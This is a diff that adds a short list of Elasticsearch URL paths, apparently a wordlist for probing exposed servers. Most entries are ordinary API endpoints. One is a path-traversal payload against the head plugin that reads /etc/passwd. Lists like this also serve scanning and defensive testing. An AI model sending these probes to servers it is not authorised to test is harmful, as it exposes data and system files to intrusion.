@@ -1,0 +1,7 @@
+/_cluster/settings
+/?pretty
+/_cat/indices?v
+/_all/_search
+/_cluster/health?pretty
+/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd
+/_bulk
